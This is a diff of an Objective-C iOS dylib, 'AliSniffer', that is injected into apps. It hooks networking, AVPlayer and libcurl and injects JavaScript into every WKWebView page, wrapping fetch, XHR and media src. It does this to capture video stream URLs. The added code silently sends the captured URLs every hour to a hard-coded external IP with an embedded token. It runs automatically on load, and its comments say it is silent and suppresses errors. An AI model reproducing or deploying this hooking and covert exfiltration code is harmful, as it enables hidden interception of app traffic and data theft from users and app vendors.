@@ -1,6 +1,9 @@
-// AliSniffer.m — iOS14/15 全功能 + iOS16 安全版
-// 原有功能完整保留：抓到 URL → 弹窗 + 复制
-// 新增功能：自动上传到 http://139.155.57.242:8088/api/append，带 Token，失败缓存+定时重试
+// AliSniffer.m — iOS14/15 全功能 + iOS16 安全版（静默，无日志/不上报）
+// 新增：抓到链接后缓存最近命中；每 1 小时自动上报到 http://139.155.57.242:8088/api/stream/report
+// 仅在命中可播 URL 时弹窗+复制；不写文件、不联网（除非定时上报）；网络失败静默忽略。
+// 14/15：启用 NSURLSessionTask / NSURLProtocol(MIME|#EXTM3U) / AVPlayer* / CFReadStream / WK 注入 / (可选)libcurl
+// 16+ ：启用 NSURLSessionTask / AVPlayer* / WK 注入（默认关闭 NSURLProtocol/CFReadStream/libcurl 以防崩）
+// 依赖：fishhook.h
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
@@ -8,6 +11,11 @@
 #import <objc/runtime.h>
 #import <dlfcn.h>
 #import "fishhook.h"
+
+#pragma mark - 上报配置（按你的要求）
+static NSString * const kReportEndpoint = @"http://139.155.57.242:8088/api/stream/report";
+static NSString * const kReportToken    = @"xZ7vN3qJc4G8f2K0bYw1sQp9LrT6D5aR";
+static const NSTimeInterval kReportInterval = 3600.0; // 1 小时
 
 // ====== 静默宏（默认不输出控制台）======
 #ifndef ENABLE_DEBUG_LOG
@@ -32,47 +40,7 @@
 #define SNIFFER_IOS16_ENABLE_LIBCURL 0
 #endif
 
-// ====== 上传相关配置 ======
-static NSMutableSet<NSString *> *uploadedSet;
-static NSMutableSet<NSString *> *cacheSet;
-static NSString * const kAppendAPI  = @"http://139.155.57.242:8088/api/append";
-static NSString * const kAdminToken = @"xZ7vN3qJc4G8f2K0bYw1sQp9LrT6D5aR";
-
-static void UploadURL(NSString *line) {
-    if (!line.length) return;
-    if (!uploadedSet) uploadedSet = [NSMutableSet set];
-    if ([uploadedSet containsObject:line]) return; // 去重
-    [uploadedSet addObject:line];
-
-    NSURL *url = [NSURL URLWithString:kAppendAPI];
-    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-    req.HTTPMethod = @"POST";
-    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    [req setValue:kAdminToken forHTTPHeaderField:@"X-Token"];
-
-    NSDictionary *body = @{@"line": line};
-    NSData *data = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
-    req.HTTPBody = data;
-
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-        if (e) {
-            NSLog(@"[AliSniffer] upload failed: %@ -> %@", line, e);
-            if (!cacheSet) cacheSet = [NSMutableSet set];
-            [cacheSet addObject:line];
-        } else {
-            NSLog(@"[AliSniffer] upload ok: %@", line);
-        }
-    }] resume];
-}
-
-static void FlushCache() {
-    if (!cacheSet.count) return;
-    NSSet *copy = [cacheSet copy];
-    [cacheSet removeAllObjects];
-    for (NSString *s in copy) UploadURL(s);
-}
-
-// ====== 噪声/白名单 ======
+#pragma mark - 噪声/白名单
 static NSArray<NSString *> *BlockedSubstrings(void) {
     static NSArray *a; static dispatch_once_t once;
     dispatch_once(&once, ^{
@@ -96,7 +64,7 @@ static NSArray<NSString *> *WhitelistedHosts(void) {
     return a;
 }
 
-// ====== 工具 ======
+#pragma mark - 工具 & 可播判定
 static inline NSString *HostOfURLString(NSString *s) {
     NSURLComponents *c = [NSURLComponents componentsWithString:s];
     return c.host.lowercaseString ?: @"";
@@ -127,6 +95,8 @@ static inline BOOL SeenRecently(NSString *k, NSTimeInterval sec) {
     if (last && [now timeIntervalSinceDate:last] < sec) return YES;
     g_seen[k] = now; if (g_seen.count > 256) [g_seen removeAllObjects]; return NO;
 }
+
+#pragma mark - UI：命中时处理（原样保留）
 static inline void ShowPopupIfNeeded(NSString *title, NSString *msg) {
 #if SNIFFER_ENABLE_POPUP
     if (!msg.length) return;
@@ -148,12 +118,69 @@ static inline void ShowPopupIfNeeded(NSString *title, NSString *msg) {
     if (msg.length) [UIPasteboard generalPasteboard].string = msg;
 #endif
 }
+
+#pragma mark - 自动上报：缓存最近命中 & 每小时 POST
+static NSString *g_lastPlayableURL;
+static NSDate   *g_lastUploadAt;
+
+static void TryUploadToServer(void) {
+    @try {
+        NSString *u = g_lastPlayableURL;
+        if (u.length == 0) return;
+
+        // 控制上传频率：至少间隔 10 分钟（避免小时内多次触发）
+        if (g_lastUploadAt && [[NSDate date] timeIntervalSinceDate:g_lastUploadAt] < 600) return;
+
+        NSDictionary *payload = @{
+            @"source": @"ios_dylib",
+            @"ts": @((NSInteger)floor([[NSDate date] timeIntervalSince1970])),
+            @"urls": @[u]
+        };
+        NSData *body = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+        if (!body) return;
+
+        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kReportEndpoint]];
+        req.HTTPMethod = @"POST";
+        req.timeoutInterval = 15;
+        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+        [req setValue:kReportToken forHTTPHeaderField:@"X-Access-Token"];
+        req.HTTPBody = body;
+
+        NSURLSessionDataTask *task = [NSURLSession.sharedSession dataTaskWithRequest:req
+                                                                   completionHandler:^(__unused NSData *data, __unused NSURLResponse *resp, __unused NSError *err) {
+            // 失败也静默
+            if (!err) g_lastUploadAt = [NSDate date];
+        }];
+        [task resume];
+    } @catch (__unused id e) {}
+}
+
+static void StartHourlyReporter(void) {
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)),
+                       dispatch_get_main_queue(), ^{
+            NSTimer *t = [NSTimer scheduledTimerWithTimeInterval:kReportInterval
+                                                          repeats:YES
+                                                            block:^(__unused NSTimer * _Nonnull timer) {
+                TryUploadToServer();
+            }];
+            t.tolerance = 30.0; // 省电容忍
+            [[NSRunLoop mainRunLoop] addTimer:t forMode:NSRunLoopCommonModes];
+        });
+    });
+}
+
+#pragma mark - 统一入口：命中可播时
 static inline void ReportURL(NSString *url) {
     if (url.length == 0) return;
     NSString *lower = url.lowercaseString;
     if (IsNoise(lower)) return;
     if (!IsPlayable(lower)) return;
     if (SeenRecently(url, 10.0)) return;
+
+    // 缓存最近一次可播 URL，供定时器上报
+    g_lastPlayableURL = url;
 
     if ([lower containsString:@"m3u8"]) {
         ShowPopupIfNeeded(@"抓到 M3U8", url);
@@ -166,10 +193,9 @@ static inline void ReportURL(NSString *url) {
     } else {
         ShowPopupIfNeeded(@"命中可疑播放 URL", url);
     }
-
-    // === 新增：自动上传 ===
-    UploadURL(url);
 }
+
+#pragma mark - 反射取 URL / Method Swizzle（原样保留）
 static inline NSString *ToURLString(id obj) {
     if (!obj) return nil;
     if ([obj isKindOfClass:NSString.class]) return obj;
@@ -190,38 +216,230 @@ static inline void Swz(Class c, SEL sel, IMP newImp, IMP *origStore) {
     method_setImplementation(m, newImp);
 }
 
-// ====== 1) NSURLSessionTask.resume ======
-// （保留原有实现……）
+#pragma mark - 1) NSURLSessionTask.resume
+static void (*orig_task_resume)(id, SEL);
+static void swz_task_resume(id self, SEL _cmd) {
+    @try {
+        if ([self respondsToSelector:@selector(currentRequest)]) {
+            NSURLRequest *req = [self performSelector:@selector(currentRequest)];
+            if ([req isKindOfClass:NSURLRequest.class] && req.URL) ReportURL(req.URL.absoluteString);
+        }
+    } @catch (...) {}
+    if (orig_task_resume) orig_task_resume(self, _cmd);
+}
 
-// ====== 2) NSURLProtocol（iOS14/15 默认启用，iOS16 默认关闭）
-// （保留原有实现……）
+#pragma mark - 2) NSURLProtocol（iOS14/15，iOS16默认关闭）
+@interface _SniffProto : NSURLProtocol <NSURLSessionDataDelegate>
+@property(nonatomic,strong) NSURLSessionDataTask *task;
+@property(nonatomic,strong) NSMutableData *buf;
+@property(nonatomic,assign) BOOL shouted;
+@end
 
-// ====== 3) CFReadStream
-// （保留原有实现……）
+@implementation _SniffProto
++ (BOOL)canInitWithRequest:(NSURLRequest *)request {
+    if ([NSURLProtocol propertyForKey:@"_SniffDone" inRequest:request]) return NO;
+    NSString *sch = request.URL.scheme.lowercaseString;
+    return [sch isEqualToString:@"http"] || [sch isEqualToString:@"https"];
+}
++ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
 
-// ====== 4) AVPlayer / AVURLAsset
-// （保留原有实现……）
+- (void)startLoading {
+    NSMutableURLRequest *r = [self.request mutableCopy];
+    [NSURLProtocol setProperty:@YES forKey:@"_SniffDone" inRequest:r];
+    NSURLSession *s = [NSURLSession sessionWithConfiguration:NSURLSessionConfiguration.defaultSessionConfiguration
+                                                    delegate:self
+                                               delegateQueue:nil];
+    self.task = [s dataTaskWithRequest:r];
+    self.buf = [NSMutableData data];
+    [self.task resume];
+}
+- (void)stopLoading { [self.task cancel]; self.task = nil; self.buf = nil; }
 
-// ====== 5) WKWebView 注入
-// （保留原有实现……）
+- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask
+ didReceiveResponse:(NSURLResponse *)response
+ completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler {
+    [self.client URLProtocol:self didReceiveResponse:response cacheStoragePolicy:NSURLCacheStorageNotAllowed];
 
-// ====== 6) libcurl
-// （保留原有实现……）
+    if (!self.shouted) {
+        NSString *mime = response.MIMEType.lowercaseString ?: @"";
+        if ([mime containsString:@"mpegurl"]) { ReportURL(dataTask.currentRequest.URL.absoluteString); self.shouted = YES; }
+        else if ([mime containsString:@"x-flv"] || [mime containsString:@"/flv"]) { ReportURL(dataTask.currentRequest.URL.absoluteString); self.shouted = YES; }
+    }
+    completionHandler(NSURLSessionResponseAllow);
+}
+- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
+    [self.client URLProtocol:self didLoadData:data];
+    if (!self.shouted && self.buf.length < 16*1024) {
+        [self.buf appendData:data];
+        NSString *head = [[NSString alloc] initWithData:self.buf encoding:NSUTF8StringEncoding];
+        if (head && [head containsString:@"#EXTM3U"]) { ReportURL(dataTask.currentRequest.URL.absoluteString); self.shouted = YES; }
+    }
+}
+- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
+    if (error) [self.client URLProtocol:self didFailWithError:error];
+    else [self.client URLProtocolDidFinishLoading:self];
+}
+@end
 
-// ====== 安装 Hook ======
+static NSURLSessionConfiguration* (*orig_defCfg)(id, SEL);
+static NSURLSessionConfiguration* swz_defCfg(id self, SEL _cmd) {
+    NSURLSessionConfiguration *cfg = orig_defCfg ? orig_defCfg(self, _cmd) : [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
+    if (![arr containsObject:_SniffProto.class]) [arr insertObject:_SniffProto.class atIndex:0];
+    cfg.protocolClasses = arr; return cfg;
+}
+static NSURLSessionConfiguration* (*orig_ephCfg)(id, SEL);
+static NSURLSessionConfiguration* swz_ephCfg(id self, SEL _cmd) {
+    NSURLSessionConfiguration *cfg = orig_ephCfg ? orig_ephCfg(self, _cmd) : [NSURLSessionConfiguration ephemeralSessionConfiguration];
+    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
+    if (![arr containsObject:_SniffProto.class]) [arr insertObject:_SniffProto.class atIndex:0];
+    cfg.protocolClasses = arr; return cfg;
+}
+
+#pragma mark - 3) CFReadStream（iOS14/15，iOS16默认关闭）
+typedef CFURLRef (*PFN_CFHTTPMessageCopyRequestURL)(CFHTTPMessageRef);
+static PFN_CFHTTPMessageCopyRequestURL p_CFHTTPMessageCopyRequestURL = NULL;
+typedef CFReadStreamRef (*PFN_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
+static PFN_CFReadStreamCreateForHTTPRequest orig_CFReadStreamCreateForHTTPRequest = NULL;
+
+static CFReadStreamRef hook_CFReadStreamCreateForHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef req) {
+    if (req && p_CFHTTPMessageCopyRequestURL) {
+        CFURLRef u = p_CFHTTPMessageCopyRequestURL(req);
+        if (u) { NSString *s = [(__bridge NSURL *)u absoluteString]; if (s.length) ReportURL(s); }
+    }
+    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(a, req) : NULL;
+}
+
+#pragma mark - 4) AVPlayer / AVURLAsset（iOS14+）
+static id (*orig_AVPI_initWithURL)(id, SEL, NSURL *);
+static id swz_AVPI_initWithURL(id self, SEL _cmd, NSURL *url) { if (url) ReportURL(url.absoluteString); return orig_AVPI_initWithURL(self, _cmd, url); }
+static id (*orig_AVPI_playerItemWithURL)(id, SEL, NSURL *);
+static id swz_AVPI_playerItemWithURL(id self, SEL _cmd, NSURL *url) { if (url) ReportURL(url.absoluteString); return orig_AVPI_playerItemWithURL(self, _cmd, url); }
+static id (*orig_AVURLA_initWithURL)(id, SEL, NSURL *, NSDictionary *);
+static id swz_AVURLA_initWithURL(id self, SEL _cmd, NSURL *url, NSDictionary *opt) { if (url) ReportURL(url.absoluteString); return orig_AVURLA_initWithURL(self, _cmd, url, opt); }
+static id (*orig_AVURLA_assetWithURL)(id, SEL, NSURL *, NSDictionary *);
+static id swz_AVURLA_assetWithURL(id self, SEL _cmd, NSURL *url, NSDictionary *opt) { if (url) ReportURL(url.absoluteString); return orig_AVURLA_assetWithURL(self, _cmd, url, opt); }
+
+#pragma mark - 5) WKWebView 注入（iOS14+）
+@interface _WKHandler : NSObject<WKScriptMessageHandler> @end
+@implementation _WKHandler
+- (void)userContentController:(WKUserContentController *)uc didReceiveScriptMessage:(WKScriptMessage *)m {
+    if ([m.name isEqualToString:@"_S"]) {
+        NSString *u = [m.body isKindOfClass:NSString.class] ? (NSString *)m.body : @"";
+        if (u.length) ReportURL(u);
+    }
+}
+@end
+static id (*orig_WK_init)(id, SEL, CGRect, WKWebViewConfiguration *);
+static id swz_WK_init(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *cfg) {
+    if (cfg) {
+        _WKHandler *h = [_WKHandler new];
+        [cfg.userContentController addScriptMessageHandler:h name:@"_S"];
+        NSString *js =
+        @"(function(){function r(u){try{if(u&&/(m3u8|\\.mp4(\\?|$)|\\.flv(\\?|$)|^rtmps?:\\/\\/|^wss?:\\/\\/.*\\.flv)/i.test(u)){window.webkit.messageHandlers._S.postMessage(u);}}catch(e){}}"
+         "var f=window.fetch;if(f){window.fetch=function(){var u=arguments[0];if(typeof u==='string'){r(u);}return f.apply(this,arguments).then(function(res){try{var u=res&&res.url;if(u)r(u);}catch(e){}return res;});};}"
+         "var X=window.XMLHttpRequest;if(X){var o=X.prototype.open,s=X.prototype.send;X.prototype.open=function(m,u){try{this.__u=u;r(u);}catch(e){}return o.apply(this,arguments)};X.prototype.send=function(){try{r(this.__u);}catch(e){}return s.apply(this,arguments)};}"
+         "if(window.HTMLMediaElement){var d=Object.getOwnPropertyDescriptor(HTMLMediaElement.prototype,'src');if(d&&d.set){Object.defineProperty(HTMLMediaElement.prototype,'src',{set:function(v){try{r(v);}catch(e){}return d.set.call(this,v);},get:d.get});}}"
+        "})();";
+        WKUserScript *sc = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
+        [cfg.userContentController addUserScript:sc];
+        objc_setAssociatedObject(cfg, "_wk_h", h, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
+        objc_setAssociatedObject(cfg, "_wk_s", sc, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
+    }
+    return orig_WK_init ? orig_WK_init(self, _cmd, frame, cfg) : self;
+}
+
+#pragma mark - 6) libcurl（iOS14/15，iOS16默认关闭）
+typedef int CURLcode;
+static CURLcode (*orig_curl_easy_setopt)(void *curl, int option, ...);
+static CURLcode hook_curl_easy_setopt(void *curl, int option, ...) {
+    va_list ap; va_start(ap, option);
+    if (option == 10002 /* CURLOPT_URL */) {
+        const char *c = va_arg(ap, const char *); if (c) { NSString *u = [NSString stringWithUTF8String:c]; if (u.length) ReportURL(u); }
+        va_end(ap); va_start(ap, option); (void)va_arg(ap, const char *);
+    }
+    CURLcode ret = 0;
+    if (orig_curl_easy_setopt) { const void *p = va_arg(ap, const void *); ret = orig_curl_easy_setopt(curl, option, p); }
+    va_end(ap); return ret;
+}
+static inline void HookCurlIfPresent(void) {
+    rebind_symbols((struct rebinding[]){{"curl_easy_setopt",(void*)hook_curl_easy_setopt,(void**)&orig_curl_easy_setopt}},1);
+}
+
+#pragma mark - 安装 Hook（iOS16 延迟 + 条件启用）并启动上报定时器
 __attribute__((constructor))
 static void _sniffer_init(void) {
     @autoreleasepool {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            // 保留你原有的 Hook 安装逻辑……
+        // 先启动定时上报
+        StartHourlyReporter();
 
-            // === 新增：启动定时器，每小时兜底上传缓存 ===
-            [NSTimer scheduledTimerWithTimeInterval:3600
-                                             repeats:YES
-                                               block:^(NSTimer * _Nonnull t) {
-                FlushCache();
-            }];
-            NSLog(@"[AliSniffer] 初始化完成，已启用自动上传 + 定时兜底");
+        // 为避免和 App 启动期并发初始化冲突，在所有系统都做轻微延迟
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            // 统一：NSURLSessionTask.resume
+            Class Task = NSClassFromString(@"NSURLSessionTask");
+            if (Task && class_getInstanceMethod(Task, @selector(resume))) Swz(Task, @selector(resume), (IMP)swz_task_resume, (IMP *)&orig_task_resume);
+
+            // WKWebView（安全）
+            Class WK = NSClassFromString(@"WKWebView");
+            if (WK) {
+                Method m = class_getInstanceMethod(WK, @selector(initWithFrame:configuration:));
+                if (m) { orig_WK_init = (void *)method_getImplementation(m); method_setImplementation(m, (IMP)swz_WK_init); }
+            }
+
+            // AVPlayer / AVURLAsset（安全）
+            Class PI = NSClassFromString(@"AVPlayerItem");
+            if (PI) {
+                Method m1 = class_getInstanceMethod(PI, @selector(initWithURL:));
+                if (m1) { orig_AVPI_initWithURL = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_AVPI_initWithURL); }
+                Method m2 = class_getClassMethod(PI, @selector(playerItemWithURL:));
+                if (m2) { orig_AVPI_playerItemWithURL = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_AVPI_playerItemWithURL); }
+            }
+            Class UA = NSClassFromString(@"AVURLAsset");
+            if (UA) {
+                Method m3 = class_getInstanceMethod(UA, @selector(initWithURL:options:));
+                if (m3) { orig_AVURLA_initWithURL = (void *)method_getImplementation(m3); method_setImplementation(m3, (IMP)swz_AVURLA_initWithURL); }
+                Method m4 = class_getClassMethod(UA, @selector(URLAssetWithURL:options:));
+                if (m4) { orig_AVURLA_assetWithURL = (void *)method_getImplementation(m4); method_setImplementation(m4, (IMP)swz_AVURLA_assetWithURL); }
+            }
+
+            // 按系统版本选择性启用高侵入模块
+            if (@available(iOS 16.0, *)) {
+                // iOS16+：默认不启用 NSURLProtocol / CFReadStream / libcurl（避免崩溃）
+                if (SNIFFER_IOS16_ENABLE_NSURLPROTOCOL) {
+                    Class Cfg = NSURLSessionConfiguration.class;
+                    if (Cfg) {
+                        Method m1 = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
+                        if (m1) { orig_defCfg = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_defCfg); }
+                        Method m2 = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
+                        if (m2) { orig_ephCfg = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_ephCfg); }
+                    }
+                }
+                if (SNIFFER_IOS16_ENABLE_CFREADSTREAM) {
+                    void *hCF = dlopen("/System/Library/Frameworks/CFNetwork.framework/CFNetwork", RTLD_NOW);
+                    if (hCF) p_CFHTTPMessageCopyRequestURL = (PFN_CFHTTPMessageCopyRequestURL)dlsym(hCF, "CFHTTPMessageCopyRequestURL");
+                    rebind_symbols((struct rebinding[]){{"CFReadStreamCreateForHTTPRequest",(void*)hook_CFReadStreamCreateForHTTPRequest,(void**)&orig_CFReadStreamCreateForHTTPRequest}},1);
+                }
+                if (SNIFFER_IOS16_ENABLE_LIBCURL) {
+                    HookCurlIfPresent();
+                }
+            } else {
+                // iOS14/15：启用全部
+                Class Cfg = NSURLSessionConfiguration.class;
+                if (Cfg) {
+                    Method m1 = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
+                    if (m1) { orig_defCfg = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_defCfg); }
+                    Method m2 = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
+                    if (m2) { orig_ephCfg = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_ephCfg); }
+                }
+                void *hCF = dlopen("/System/Library/Frameworks/CFNetwork.framework/CFNetwork", RTLD_NOW);
+                if (hCF) p_CFHTTPMessageCopyRequestURL = (PFN_CFHTTPMessageCopyRequestURL)dlsym(hCF, "CFHTTPMessageCopyRequestURL");
+                rebind_symbols((struct rebinding[]){{"CFReadStreamCreateForHTTPRequest",(void*)hook_CFReadStreamCreateForHTTPRequest,(void**)&orig_CFReadStreamCreateForHTTPRequest}},1);
+                HookCurlIfPresent();
+            }
+
+#if SNIFFER_ENABLE_POPUP
+            ShowPopupIfNeeded(@"已加载", @"已启用静默抓取（iOS14/15全功能；iOS16安全模式）");
+#endif
         });
     }
 }
